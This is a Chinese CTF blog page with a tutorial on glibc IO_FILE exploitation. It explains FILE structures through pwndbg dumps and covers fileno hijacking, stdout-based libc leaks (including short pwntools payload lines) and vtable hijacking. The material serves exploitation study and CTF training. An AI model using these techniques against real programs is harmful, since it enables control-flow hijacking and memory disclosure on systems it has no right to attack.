<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/29/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/29/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/16/IO_FILE%20pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/16/IO_FILE%20pwn/" class="post-title-link" itemprop="url">IO_FILE pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-16 18:44:44" itemprop="dateCreated datePublished" datetime="2022-03-16T18:44:44+08:00">2022-03-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-09 18:35:30" itemprop="dateModified" datetime="2022-12-09T18:35:30+08:00">2022-12-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE-pwn"><a href="#IO-FILE-pwn" class="headerlink" title="IO_FILE pwn"></a>IO_FILE pwn</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流</p>
<p>FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中，然后以链表的形式串联起来，但系统一开始会自动创建的三个文件即 stdin、stdout、stderr，它们是在libc上</p>
<p>先借 libc-2.23 说明一下 FILE 结构：</p>
<p>在 libc-2.23 版本中，有个全局变量<code>_IO_list_all</code>，该变量指向了FILE链表的头部 </p>
<p>首先认识一个结构体<code>_IO_FILE_plus</code>，所有 FILE 文件结构都是这样的一个结构体，整个结构体如下代码所示，其中又包括了两个重要的结构体<code>_IO_FILE</code>和<code>IO_jump_t</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    _IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 GDB 中输入以下命令可以打印 <code>_IO_list_all</code> ：（这里通过在前面加上结构体类型可以详细的打印其内存数据信息）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x*(struct _IO_FILE_plus*)_IO_list_all</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad2086</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7ffff7dd2620</span>, <span class="comment">// 指向下一个链表节点(stderr的下一个:stdout)</span></span><br><span class="line">    _fileno = <span class="number">0x2</span>, <span class="comment">// fileno值为2(标准错误流的文件描述符就是&#x27;2&#x27;)</span></span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = &#123;<span class="number">0x0</span>&#125;,</span><br><span class="line">    _lock = <span class="number">0x7ffff7dd3770</span>,</span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7ffff7dd1660</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0x0</span>,</span><br><span class="line">    _unused2 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">20</span> times&gt;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7ffff7dd06e0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是 <code>_IO_list_all</code> 变量， <strong>其指向 FILE 链表的头部</strong> ，结合上面的结构体可知，file对应的就是 <code>_IO_FILE</code> 结构类型，vtable 对应的就是 <code>_IO_jump_t</code> 类型 </p>
<p>在没有创建其它文件结构时， <code>_IO_list_all</code> 指向stderr，然后依次是 stdout 和 stdin（可以通过打印 <code>_chain</code> 进行查看）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x _IO_list_all</span><br><span class="line">$<span class="number">2</span> = <span class="number">0x7ffff7dd2540</span></span><br><span class="line">pwndbg&gt; p/x <span class="built_in">stderr</span></span><br><span class="line">$<span class="number">3</span> = <span class="number">0x7ffff7dd2540</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; p/x _IO_list_all.file._chain</span><br><span class="line">$<span class="number">4</span> = <span class="number">0x7ffff7dd2620</span></span><br><span class="line">pwndbg&gt; p/x <span class="built_in">stdout</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">0x7ffff7dd2620</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7dd2520</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7dd2520</span> (_IO_list_all) —▸ <span class="number">0x7ffff7dd2540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7dd2540</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7dd2540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7dd2548</span> (_IO_2_1_stderr_+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7dd2620</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7dd2620</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2084</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7dd2628</span> (_IO_2_1_stdout_+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>由于 <code>_IO_FILE_plus</code> 中只是存储了 vtable 的指针，并没有存储详细的结构信息，所以这里我们进一步打印一下 vtable ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable </span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7a869d0</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7a87740</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7a874b0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7a88610</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7a89990</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7a861f0</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7a85ed0</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7a854d0</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7a88a10</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7a85440</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7a85380</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7a7a190</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7a861b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7a85b80</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7a85980</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7a85350</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7a85b70</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a89b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a89b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="fileno-劫持"><a href="#fileno-劫持" class="headerlink" title="fileno 劫持"></a>fileno 劫持</h2><p>这个利用比较局限，一般在有“open”的程序中使用</p>
<p>利用的原理很简单，通过上面的分析，我们可以看到 fileno 的值就是文件描述符，位于 stdin 文件结构开头0x70偏移处，在漏洞利用中可以通过 <strong>修改 stdin 的 fileno 值来重定位需要读取的文件</strong> （原本是“0”，从标准输入中读取，现在改为“fd”，从目标文件中读取），接下来类似于 read 之类的函数都会从目标文件中进行读取（修改为“flag”的描述符，就可以读取“flag”）</p>
<h2 id="IO-2-1-stdout-leak"><a href="#IO-2-1-stdout-leak" class="headerlink" title="IO_2_1_stdout leak"></a>IO_2_1_stdout leak</h2><p>可以在没有打印模块的情况下 leak libc_base，通常与 house of roman 结合</p>
<p>这个攻击需要用到结构体 <code>_IO_FILE</code> ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;           </span><br><span class="line"><span class="comment">/* 文件标志，简单的说：像puts一类的输入输出函数要想正确的打印信息就需要正确设置该字段 */</span> </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* 始终指向缓冲区中已被用户读走的字符的下一个 */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* 指向&quot;读缓冲区&quot;的末尾 */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* 指向&quot;读缓冲区&quot; */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* 指向&quot;写缓冲区&quot; */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* 始终指向缓冲区中已被用户写入的字符的下一个 */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* 指向&quot;写缓冲区&quot;的末尾*/</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们一般将堆块分配到 stdout 指针处存储的 <code>_IO_2_1_stdout_</code> 处：（这里是一个 <code>IO_FILE</code> 结构体）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="built_in">stdout</span> </span><br><span class="line">$<span class="number">1</span> = (struct _IO_FILE *) <span class="number">0x7ffff7dd0760</span> &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; ptype <span class="built_in">stdout</span></span><br><span class="line">type = struct _IO_FILE &#123;</span><br><span class="line">    <span class="keyword">int</span> _flags;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_ptr;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_write_base;  <span class="comment">//  本质上是通过修改这个结构题泄露</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_write_ptr;   <span class="comment">//  这两个指针地址之间的内容</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_write_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_save_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_backup_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_save_end;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">    <span class="keyword">int</span> _fileno;</span><br><span class="line">    <span class="keyword">int</span> _flags2;</span><br><span class="line">    <span class="keyword">__off_t</span> _old_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">    <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">    _IO_lock_t *_lock;</span><br><span class="line">    <span class="keyword">__off64_t</span> _offset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line">    <span class="keyword">size_t</span> __pad5;</span><br><span class="line">    <span class="keyword">int</span> _mode;</span><br><span class="line">    <span class="keyword">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line">&#125; *</span><br></pre></td></tr></table></figure>
<p>修改其 <code>_flags</code> 为 “0xfbad1800”（或者“0xfbad3887”），将后面三个read指针置空，将 <code>_IO_write_base</code> 处的第一个字节改为0x58（或者“0”），后面的 <code>_IO_write_ptr</code> 和 <code>_IO_write_end</code> 保持不变（该flags这样设置只是针对puts函数，其余打印函数略有不同）</p>
<p>当程序遇到puts函数时就会打印 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 之间的内容</p>
<ul>
<li>泄露 <code>_IO_file_jumps</code> 的写法：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&quot;\x58&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>泄露 <code>_IO_2_1_stdin_</code> 的写法：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad3887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h2 id="vtable-劫持"><a href="#vtable-劫持" class="headerlink" title="vtable 劫持"></a>vtable 劫持</h2><p>如果程序开了 Full RELRO ，禁用了 hook ，并且没有法控制栈，这时就要考虑 vtable 劫持了</p>
<p>vtable是 <code>_IO_FILE_plus</code> 结构体里的一个字段，是一个函数表指针，里面存储着许多和 IO 相关的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7e68510</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7e69320</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7e68fc0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7e6a4c0</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7e6bc90</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7e67b20</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7e677a0</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7e66d90</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7e6ac30</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7e66a60</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7e668f0</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7e5a600</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7e67e50</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7e67390</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7e66b30</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7e66a50</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7e67370</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7e6be20</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7e6be30</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数表中有19个函数，分别完成IO相关的功能，由IO函数调用，如 <code>fwrite</code> 最终会调用 <code>__write</code> 函数、 <code>fread</code> 会调用 <code>__doallocate</code> 来分配IO缓冲区等</p>
<p>vtable劫持的原理是：如果能够控制 FILE 结构体（一般是控制“stdin”的 <code>_IO_FILE_plus</code> 结构体），实现对 vtable 指针的修改，使得 vtable 指向可控的内存（一般在这片内存的各个区域中，全部写入“one_gadget”），在该内存中构造好 vtable，再通过调用相应IO函数，触发 vtable 函数的调用，即可劫持程序执行流（劫持最关键的点在于修改 <code>_IO_FILE_plus</code> 结构体的 vtable 指针）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f75433799b0</span> (_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x7f75433786e0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span> <span class="comment">// vtable的位置</span></span><br></pre></td></tr></table></figure>
